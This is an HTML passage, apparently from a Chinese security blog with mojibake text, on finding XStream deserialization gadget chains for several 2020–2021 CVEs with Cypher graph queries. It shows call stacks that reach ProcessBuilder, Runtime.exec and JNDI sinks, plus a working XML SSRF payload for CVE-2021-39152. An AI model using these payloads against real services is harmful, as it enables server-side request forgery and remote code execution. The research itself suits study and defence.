class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">wasTransportSecure</span>&gt;</span>false<span class="tag">&lt;/<span class="name">wasTransportSecure</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">isAdapterDeliversNonAnonymousResponse</span>&gt;</span>false<span class="tag">&lt;/<span class="name">isAdapterDeliversNonAnonymousResponse</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">packetTakesPriorityOverRequestContext</span>&gt;</span>false<span class="tag">&lt;/<span class="name">packetTakesPriorityOverRequestContext</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">invocationProperties</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">state</span>&gt;</span>ServerRequest<span class="tag">&lt;/<span class="name">state</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">isFastInfosetDisabled</span>&gt;</span>false<span class="tag">&lt;/<span class="name">isFastInfosetDisabled</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">packet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">indexMap</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">comparator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="CVE-2021-39152"><a href="#CVE-2021-39152" class="headerlink" title="CVE-2021-39152"></a>CVE-2021-39152</h3><p>è¿™ä¸ªé“¾åº”è¯¥æ˜¯ ssrfæœ€çŸ­çš„é“¾äº†</p><h4 id="å¯»æ‰¾Bullet-1"><a href="#å¯»æ‰¾Bullet-1" class="headerlink" title="å¯»æ‰¾Bullet"></a>å¯»æ‰¾Bullet</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.net.URL#openConnection</span><br></pre></td></tr></table></figure><h4 id="å¯»æ‰¾ä¸­é—´é“¾-1"><a href="#å¯»æ‰¾ä¸­é—´é“¾-1" class="headerlink" title="å¯»æ‰¾ä¸­é—´é“¾"></a>å¯»æ‰¾ä¸­é—´é“¾</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;m0d9 xstream URLDNS</span><br><span class="line">match path&#x3D;(m1:Method)-[r:CALL]-(m2:Method&#123;NAME:&quot;openConnection&quot;,CLASSNAME:&quot;java.net.URL&quot;&#125;) return m1.CLASSNAME,m1.NAME,m1.PARAMETERS</span><br></pre></td></tr></table></figure><p>èŠ‚ç‚¹å¾ˆå¤šï¼Œä»¥jdk.nashorn.internal.runtime.Source$URLData#loadMeta ä¸ºä¾‹<br><img src="/images/pasted-160.png" alt="upload successful"></p><h4 id="å¯»æ‰¾Trigger-1"><a href="#å¯»æ‰¾Trigger-1" class="headerlink" title="å¯»æ‰¾Trigger"></a>å¯»æ‰¾Trigger</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;m0d9 xstream URL URLData</span><br><span class="line">match (source:Method) where source.NAME in [&quot;compare&quot;,&quot;hashCode&quot;,&quot;equals&quot;,&quot;compareTo&quot;,&quot;toString&quot;]</span><br><span class="line">match (m1:Method) where  m1.NAME&#x3D;&quot;loadMeta&quot; and m1.CLASSNAME&#x3D;&quot;jdk.nashorn.internal.runtime.Source$URLData&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;, 10) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-159.png" alt="upload successful"></p><h4 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.runtime.Source_-URLData</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://localhost:8080/internal/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">cs</span>&gt;</span>GBK<span class="tag">&lt;/<span class="name">cs</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">hash</span>&gt;</span>1111<span class="tag">&lt;/<span class="name">hash</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">array</span>&gt;</span>b<span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">length</span>&gt;</span>0<span class="tag">&lt;/<span class="name">length</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">lastModified</span>&gt;</span>0<span class="tag">&lt;/<span class="name">lastModified</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.runtime.Source_-URLData</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.runtime.Source_-URLData</span> <span class="attr">reference</span>=<span class="string">&#x27;../jdk.nashorn.internal.runtime.Source_-URLData&#x27;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.runtime.Source_-URLData</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://localhost:8080/internal/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">cs</span> <span class="attr">reference</span>=<span class="string">&#x27;../../../entry/jdk.nashorn.internal.runtime.Source_-URLData/cs&#x27;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">hash</span>&gt;</span>1111<span class="tag">&lt;/<span class="name">hash</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">array</span>&gt;</span>b<span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">length</span>&gt;</span>0<span class="tag">&lt;/<span class="name">length</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">lastModified</span>&gt;</span>0<span class="tag">&lt;/<span class="name">lastModified</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.runtime.Source_-URLData</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.runtime.Source_-URLData</span> <span class="attr">reference</span>=<span class="string">&#x27;../jdk.nashorn.internal.runtime.Source_-URLData&#x27;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="CVE-2021-21351"><a href="#CVE-2021-21351" class="headerlink" title="CVE-2021-21351"></a>CVE-2021-21351</h3><h4 id="å¯»æ‰¾æ ¸å¿ƒè°ƒç”¨é“¾1"><a href="#å¯»æ‰¾æ ¸å¿ƒè°ƒç”¨é“¾1" class="headerlink" title="å¯»æ‰¾æ ¸å¿ƒè°ƒç”¨é“¾1"></a>å¯»æ‰¾æ ¸å¿ƒè°ƒç”¨é“¾1</h4><p>ä¸­é—´é“¾ä»¥com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces#parseSomeä¸ºä¾‹</p><p><img src="/images/pasted-171.png" alt="upload successful"></p><p><img src="/images/pasted-172.png" alt="upload successful"><br>å‘ç°methodã€classã€argséƒ½å¯æ§ï¼Œéœ€è¦åšçš„å°±æ˜¯æ‰¾åˆ°ä¸€æ¡é“¾</p><h4 id="å¯»æ‰¾æ ¸å¿ƒè°ƒç”¨é“¾2"><a href="#å¯»æ‰¾æ ¸å¿ƒè°ƒç”¨é“¾2" class="headerlink" title="å¯»æ‰¾æ ¸å¿ƒè°ƒç”¨é“¾2"></a>å¯»æ‰¾æ ¸å¿ƒè°ƒç”¨é“¾2</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) where source.NAME in [&quot;compare&quot;,&quot;hashCode&quot;,&quot;equals&quot;,&quot;compareTo&quot;,&quot;toString&quot;]</span><br><span class="line">match (m1:Method) where m1.NAME&#x3D;&quot;parseSome&quot; and m1.CLASSNAME&#x3D;&quot;com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;,10) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-170.png" alt="upload successful"></p><h4 id="è°ƒç”¨æ ˆ"><a href="#è°ƒç”¨æ ˆ" class="headerlink" title="è°ƒç”¨æ ˆ"></a>è°ƒç”¨æ ˆ</h4><p>è°ƒç”¨é“¾å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">connect:615, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">setAutoCommit:4067, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">parseSome:370, IncrementalSAXSource_Xerces (com.sun.org.apache.xml.internal.dtm.ref)</span><br><span class="line">deliverMoreNodes:309, IncrementalSAXSource_Xerces (com.sun.org.apache.xml.internal.dtm.ref)</span><br><span class="line">nextNode:814, SAX2DTM (com.sun.org.apache.xml.internal.dtm.ref.sax2dtm)</span><br><span class="line">_firstch:534, DTMDefaultBase (com.sun.org.apache.xml.internal.dtm.ref)</span><br><span class="line">getStringValue:1294, SAX2DTM (com.sun.org.apache.xml.internal.dtm.ref.sax2dtm)</span><br><span class="line">str:206, XRTreeFrag (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">toString:312, XObject (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">equals:391, XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">compareTo:441, Rdn$RdnEntry (javax.naming.ldap)</span><br><span class="line">compareTo:420, Rdn$RdnEntry (javax.naming.ldap)</span><br><span class="line">put:568, TreeMap (java.util)</span><br><span class="line">putAll:281, AbstractMap (java.util)</span><br><span class="line">putAll:327, TreeMap (java.util)</span><br><span class="line">populateTreeMap:121, TreeMapConverter (com.thoughtworks.xstream.converters.collections)</span><br></pre></td></tr></table></figure><h3 id="CVE-2021-21346"><a href="#CVE-2021-21346" class="headerlink" title="CVE-2021-21346"></a>CVE-2021-21346</h3><h4 id="æ ¸å¿ƒè°ƒç”¨é“¾"><a href="#æ ¸å¿ƒè°ƒç”¨é“¾" class="headerlink" title="æ ¸å¿ƒè°ƒç”¨é“¾"></a>æ ¸å¿ƒè°ƒç”¨é“¾</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) where source.NAME in [&quot;compare&quot;,&quot;hashCode&quot;,&quot;equals&quot;,&quot;compareTo&quot;,&quot;toString&quot;]</span><br><span class="line">match (m1:Method) where m1.NAME&#x3D;&quot;createValue&quot; and m1.CLASSNAME&#x3D;&quot;sun.swing.SwingLazyValue&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;,10) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-175.png" alt="upload successful"></p><h4 id="è°ƒç”¨æ ˆ-1"><a href="#è°ƒç”¨æ ˆ-1" class="headerlink" title="è°ƒç”¨æ ˆ"></a>è°ƒç”¨æ ˆ</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">lookup:417, InitialContext (javax.naming)</span><br><span class="line">doLookup:290, InitialContext (javax.naming)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">createValue:73, SwingLazyValue (sun.swing)</span><br><span class="line">getFromHashtable:216, UIDefaults (javax.swing)</span><br><span class="line">get:161, UIDefaults (javax.swing)</span><br><span class="line">get:64, MultiUIDefaults (javax.swing)</span><br><span class="line">toString:197, MultiUIDefaults (javax.swing)</span><br><span class="line">equals:391, XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">compareTo:441, Rdn$RdnEntry (javax.naming.ldap)</span><br><span class="line">compareTo:420, Rdn$RdnEntry (javax.naming.ldap)</span><br><span class="line">put:568, TreeMap (java.util)</span><br><span class="line">putAll:281, AbstractMap (java.util)</span><br><span class="line">putAll:327, TreeMap (java.util)</span><br></pre></td></tr></table></figure><h3 id="CVE-2020-21347-21350"><a href="#CVE-2020-21347-21350" class="headerlink" title="CVE-2020-21347/21350"></a>CVE-2020-21347/21350</h3><p>21347/21350è¿™ä¸¤ä¸ªç±»ä¼¼ï¼Œéƒ½æ˜¯ç”¨NameProcessIteratorè‡ªå®šä¹‰classloaderåŠ è½½ï¼Œé“¾ä¹Ÿæ¯”è¾ƒç®€å•ã€‚</p><h4 id="æ ¸å¿ƒè°ƒç”¨é“¾1"><a href="#æ ¸å¿ƒè°ƒç”¨é“¾1" class="headerlink" title="æ ¸å¿ƒè°ƒç”¨é“¾1"></a>æ ¸å¿ƒè°ƒç”¨é“¾1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">match path&#x3D;(sink:Method &#123;IS_SINK:true, NAME:&quot;loadClass&quot;&#125;)&lt;-[:CALL]-(m1:Method) return m1.CLASSNAME,m1.NAME,m1.PARAMETERS</span><br><span class="line">order by m1.CLASSNAME</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-176.png" alt="upload successful"></p><h4 id="æ ¸å¿ƒè°ƒç”¨é“¾2"><a href="#æ ¸å¿ƒè°ƒç”¨é“¾2" class="headerlink" title="æ ¸å¿ƒè°ƒç”¨é“¾2"></a>æ ¸å¿ƒè°ƒç”¨é“¾2</h4><p>æ¯”è¾ƒéš¾æçš„æ˜¯hasNextå…³è”Nextï¼Œå¾ˆå®¹æ˜“å…³è”åˆ°Triggerï¼Œé€ æˆè¯¯æŠ¥</p><p>éœ€è¦æ‰‹åŠ¨å‘ç°è‡³SequenceInputStream.nextStreamï¼Œç„¶åå‚è€ƒCVE-2020-26217çš„ByteArrayOutputStreamExé“¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">match path&#x3D;(m1:Method&#123;NAME:&quot;hasNext&quot;,CLASSNAME:&quot;com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator&quot;&#125;)-[r:CALL|ALIAS*3..10]-(m2:Method) </span><br><span class="line">where m2.NAME in [&quot;toString&quot;]</span><br><span class="line">return path limit 200</span><br></pre></td></tr></table></figure><p>è¿™éƒ¨åˆ†çš„ä¸ä¹‹ç±»ä¼¼ï¼Œä¸å•ç‹¬åˆ—äº†</p><h4 id="è°ƒç”¨æ ˆ-2"><a href="#è°ƒç”¨æ ˆ-2" class="headerlink" title="è°ƒç”¨æ ˆ"></a>è°ƒç”¨æ ˆ</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">loadClass:131, ClassLoader (com.sun.org.apache.bcel.internal.util)</span><br><span class="line">loadClass:357, ClassLoader (java.lang)</span><br><span class="line">hasNext:409, JavacProcessingEnvironment$NameProcessIterator (com.sun.tools.javac.processing)</span><br><span class="line">hasMoreElements:148, MultiUIDefaults$MultiUIDefaultsEnumerator (javax.swing)</span><br><span class="line">nextStream:109, SequenceInputStream (java.io)</span><br><span class="line">read:211, SequenceInputStream (java.io)</span><br><span class="line">readFrom:65, ByteArrayOutputStreamEx (com.sun.xml.internal.bind.v2.util)</span><br><span class="line">get:182, Base64Data (com.sun.xml.internal.bind.v2.runtime.unmarshaller)</span><br><span class="line">toString:286, Base64Data (com.sun.xml.internal.bind.v2.runtime.unmarshaller)</span><br><span class="line">compare:153, ObservableList$1 (javafx.collections)</span><br><span class="line">siftDownUsingComparator:721, PriorityQueue (java.util)</span><br><span class="line">siftDown:687, PriorityQueue (java.util)</span><br><span class="line">heapify:736, PriorityQueue (java.util)</span><br></pre></td></tr></table></figure><h3 id="CVE-2020-26217"><a href="#CVE-2020-26217" class="headerlink" title="CVE-2020-26217"></a>CVE-2020-26217</h3><h4 id="æ ¸å¿ƒè°ƒç”¨é“¾1-1"><a href="#æ ¸å¿ƒè°ƒç”¨é“¾1-1" class="headerlink" title="æ ¸å¿ƒè°ƒç”¨é“¾1"></a>æ ¸å¿ƒè°ƒç”¨é“¾1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) where source.NAME in [&quot;compare&quot;,&quot;hashCode&quot;,&quot;equals&quot;,&quot;compareTo&quot;,&quot;toString&quot;]</span><br><span class="line">match (m1:Method) where m1.NAME&#x3D;&quot;filter&quot; and m1.CLASSNAME&#x3D;&quot;javax.imageio.ImageIO$ContainsFilter&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;,10) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-173.png" alt="upload successful"></p><h4 id="è½¬æ¥ç‚¹"><a href="#è½¬æ¥ç‚¹" class="headerlink" title="è½¬æ¥ç‚¹"></a>è½¬æ¥ç‚¹</h4><p>å¯ä»¥çœ‹åˆ°ï¼Œåªæ ‡æ³¨äº†éƒ¨åˆ†çš„é“¾ï¼ŒåŸå› ä¸ºjavax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator#nextElement-&gt;java.util.Enumeration#nextElement-&gt; javax.naming.NameImpl#equals æ— æ³•èµ°é€šã€‚è¿™ç§æƒ…å†µåœ¨åç»­çš„caseç§ä¹Ÿä¼šç»å¸¸é‡åˆ°ï¼Œå› ä¸ºJavaæœ‰å¤šæ€ç‰¹æ€§ï¼Œè€ŒALIASæ˜¯çº¯é™æ€åˆ†æã€‚</p><p>ä¸Šè¿°é“¾æ²¡åŠæ³•æ‰“é€šTriggerï¼Œè¿™ä¸ªæ—¶å€™éœ€è¦æ‰‹åŠ¨åˆ†æï¼Œå‘ç°java.io.SequenceInputStream#nextStreamå¯ä»¥è°ƒç”¨e.nextElementä¸”eå¯æ§ã€‚å¦‚æ­¤ï¼Œæ¥ç€åˆ†ænextStreamåˆ°Triggerçš„å¯è¡Œæ€§ã€‚</p><h4 id="æ ¸å¿ƒè°ƒç”¨é“¾2-1"><a href="#æ ¸å¿ƒè°ƒç”¨é“¾2-1" class="headerlink" title="æ ¸å¿ƒè°ƒç”¨é“¾2"></a>æ ¸å¿ƒè°ƒç”¨é“¾2</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) where source.NAME in [&quot;toString&quot;]</span><br><span class="line">match (m1:Method) where m1.NAME&#x3D;&quot;nextStream&quot; and m1.CLASSNAME&#x3D;&quot;java.io.SequenceInputStream&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;,8) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-174.png" alt="upload successful"></p><h4 id="è°ƒç”¨æ ˆ-3"><a href="#è°ƒç”¨æ ˆ-3" class="headerlink" title="è°ƒç”¨æ ˆ"></a>è°ƒç”¨æ ˆ</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">start:1007, ProcessBuilder (java.lang)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect) [2]</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">filter:613, ImageIO$ContainsFilter (javax.imageio)</span><br><span class="line">advance:834, FilterIterator (javax.imageio.spi)</span><br><span class="line">next:852, FilterIterator (javax.imageio.spi)</span><br><span class="line">nextElement:153, MultiUIDefaults$MultiUIDefaultsEnumerator (javax.swing)</span><br><span class="line">nextStream:110, SequenceInputStream (java.io)</span><br><span class="line">read:211, SequenceInputStream (java.io)</span><br><span class="line">readFrom:65, ByteArrayOutputStreamEx (com.sun.xml.internal.bind.v2.util)</span><br><span class="line">get:182, Base64Data (com.sun.xml.internal.bind.v2.runtime.unmarshaller)</span><br><span class="line">toString:286, Base64Data (com.sun.xml.internal.bind.v2.runtime.unmarshaller)</span><br><span class="line">getStringValue:121, NativeString (jdk.nashorn.internal.objects)</span><br><span class="line">hashCode:117, NativeString (jdk.nashorn.internal.objects)</span><br><span class="line">hash:339, HashMap (java.util)</span><br><span class="line">put:612, HashMap (java.util)</span><br></pre></td></tr></table></figure><h3 id="CVE-2021-21344-21345"><a href="#CVE-2021-21344-21345" class="headerlink" title="CVE-2021-21344/21345"></a>CVE-2021-21344/21345</h3><p>21344/21345çš„è¿™ä¸ªGadgetsæ ¸å¿ƒåœ¨DataTransferer$IndexedComparatoråˆ°GetterSetterReflectionçš„æµç¨‹ï¼Œæµç¨‹æ¯”è¾ƒå¤æ‚</p><h4 id="è°ƒç”¨æ ˆ-4"><a href="#è°ƒç”¨æ ˆ-4" class="headerlink" title="è°ƒç”¨æ ˆ"></a>è°ƒç”¨æ ˆ</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">verify:173, ServerTableEntry (com.sun.corba.se.impl.activation)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">get:343, Accessor$GetterSetterReflection (com.sun.xml.internal.bind.v2.runtime.reflect)</span><br><span class="line">serializeURIs:402, ClassBeanInfoImpl (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">childAsXsiType:662, XMLSerializer (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">write:256, MarshallerImpl (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">marshal:89, BridgeImpl (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">marshal:130, Bridge (com.sun.xml.internal.bind.api)</span><br><span class="line">marshal:161, BridgeWrapper (com.sun.xml.internal.ws.db.glassfish)</span><br><span class="line">writeTo:109, JAXBAttachment (com.sun.xml.internal.ws.message)</span><br><span class="line">asInputStream:99, JAXBAttachment (com.sun.xml.internal.ws.message)</span><br><span class="line">getInputStream:125, JAXBAttachment (com.sun.xml.internal.ws.message)</span><br><span class="line">getMessage:366, XMLMessage$XMLMultiPart (com.sun.xml.internal.ws.encoding.xml)</span><br><span class="line">getAttachments:465, XMLMessage$XMLMultiPart (com.sun.xml.internal.ws.encoding.xml)</span><br><span class="line">getAttachments:103, MessageWrapper (com.sun.xml.internal.ws.api.message)</span><br><span class="line">get:111, ResponseContext (com.sun.xml.internal.ws.client)</span><br><span class="line">compareIndices:2492, DataTransferer$IndexedComparator (sun.awt.datatransfer)</span><br><span class="line">compare:2971, DataTransferer$IndexOrderComparator (sun.awt.datatransfer)</span><br><span class="line">siftDownUsingComparator:722, PriorityQueue (java.util)</span><br><span class="line">siftDown:688, PriorityQueue (java.util)</span><br><span class="line">heapify:737, PriorityQueue (java.util)</span><br><span class="line">readObject:797, PriorityQueue (java.util)</span><br></pre></td></tr></table></figure><h4 id="å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾1"><a href="#å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾1" class="headerlink" title="å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾1"></a>å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;m0d9 xstream Runtime.exec</span><br><span class="line">match path&#x3D;(m1:Method&#123;NAME:&quot;exec&quot;,CLASSNAME:&quot;java.lang.Runtime&quot;&#125;)&lt;-[r:CALL]-(m2:Method) </span><br><span class="line">return path</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-162.png" alt="upload successful"><br>å¦‚å›¾ï¼Œcom.sun.corba.se.impl.activation.ServerTableEntry#verify</p><p>å°è¯•å¯»æ‰¾Trigger</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) where source.NAME in [&quot;compare&quot;,&quot;hashCode&quot;,&quot;equals&quot;,&quot;compareTo&quot;,&quot;toString&quot;]</span><br><span class="line">match (m1:Method) where m1.NAME&#x3D;&quot;verify&quot; and m1.CLASSNAME&#x3D;&quot;com.sun.corba.se.impl.activation.ServerTableEntry&quot;</span><br><span class="line">call 